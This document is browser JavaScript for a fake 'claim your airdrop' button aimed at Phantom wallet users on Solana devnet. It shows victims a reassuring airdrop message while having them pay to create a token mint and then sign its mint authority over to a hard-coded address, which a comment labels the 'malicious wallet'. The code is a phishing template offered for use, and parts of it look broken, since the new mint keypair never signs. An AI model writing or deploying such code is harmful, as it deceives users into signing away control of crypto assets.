document.getElementById('claimButton').addEventListener('click', async () => {
    const statusElement = document.getElementById('status');
    statusElement.textContent = 'Please sign the transaction to claim your airdrop...';

    try {
        // Connect to the Solana Devnet
        const connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');

        // Get the current wallet connected to Phantom
        if (!window.solana || !window.solana.isPhantom) {
            throw new Error('Phantom wallet not detected. Please install and connect Phantom.');
        }

        await window.solana.connect({ onlyIfTrusted: true });

        const feePayer = new solanaWeb3.PublicKey(window.solana.publicKey.toString());
        const newAuthority = new solanaWeb3.PublicKey('6c7n7yKMKmzqAiem2VDJvHCkKTMeXb8ibY9AkocWyyPA'); // Replace with your malicious wallet public key

        // Setup: create a mint before changing the mint authority.
        const mint = solanaWeb3.Keypair.generate();
        const mintRent = await connection.getMinimumBalanceForRentExemption(solanaWeb3.MINT_SIZE);
        const setupInstructions = [
            solanaWeb3.SystemProgram.createAccount({
                fromPubkey: feePayer,
                newAccountPubkey: mint.publicKey,
                lamports: mintRent,
                space: solanaWeb3.MINT_SIZE,
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            }),
            solanaSplToken.Token.createInitMintInstruction(
                solanaWeb3.TOKEN_PROGRAM_ID,
                mint.publicKey,
                2,
                feePayer
            ),
        ];

        const setupBlockhash = await connection.getLatestBlockhash();
        const setupTransaction = new solanaWeb3.Transaction().add(...setupInstructions);
        setupTransaction.recentBlockhash = setupBlockhash.blockhash;
        setupTransaction.feePayer = feePayer;

        const setupSignature = await window.solana.signAndSendTransaction(setupTransaction);
        await connection.confirmTransaction(setupSignature);

        // Set authority instruction
        const setAuthorityInstruction = solanaSplToken.Token.createSetAuthorityInstruction(
            solanaWeb3.TOKEN_PROGRAM_ID,
            mint.publicKey,
            newAuthority,
            solanaSplToken.AuthorityType.MintTokens,
            feePayer
        );

        const latestBlockhash = await connection.getLatestBlockhash();
        const transaction = new solanaWeb3.Transaction().add(setAuthorityInstruction);
        transaction.recentBlockhash = latestBlockhash.blockhash;
        transaction.feePayer = feePayer;

        const signature = await window.solana.signAndSendTransaction(transaction);
        await connection.confirmTransaction(signature);

        statusElement.textContent = 'Airdrop claimed successfully!';
        console.log('Mint Address:', mint.publicKey.toString());
        console.log('New Authority Address:', newAuthority.toString());
        console.log('Transaction Signature:', signature);
    } catch (error) {
        statusElement.textContent = 'Failed to claim airdrop. Please try again.';
        console.error('Error:', error);
    }
});